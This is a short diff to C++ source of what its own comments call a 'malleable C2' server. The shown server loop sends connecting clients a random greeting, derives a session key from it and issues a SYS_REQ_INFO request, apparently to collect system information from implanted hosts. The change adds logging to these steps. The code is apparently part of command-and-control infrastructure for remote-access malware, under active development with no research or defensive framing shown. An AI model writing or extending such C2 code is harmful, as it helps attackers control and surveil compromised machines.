@@ -106,14 +106,17 @@ void Server::run() {
                 // Send malleable C2 greeting (64 random bytes)
                 uint8_t greeting[CryptoContext::GREETING_SIZE];
                 RAND_bytes(greeting, sizeof(greeting));
-                new_socket->sendRaw(greeting, sizeof(greeting));
+                bool sent = new_socket->sendRaw(greeting, sizeof(greeting));
+                std::fprintf(stdout, "[Server] Greeting sent to %s: %s\n",
+                            new_socket->getIp().c_str(), sent ? "OK" : "FAILED");
 
                 // Derive session key for this client
                 auto key = CryptoContext::deriveSessionKey(greeting);
                 new_socket->setSessionKey(key.data(), key.size());
 
                 // Send SYS_REQ_INFO using malleable format
-                new_socket->sendPacket(static_cast<uint16_t>(Opcode::SYS_REQ_INFO), "");
+                ssize_t n = new_socket->sendPacket(static_cast<uint16_t>(Opcode::SYS_REQ_INFO), "");
+                std::fprintf(stdout, "[Server] SYS_REQ_INFO sent (%zd bytes)\n", n);
 
                 m_clients.push_back({std::move(*new_socket), {}});
             }
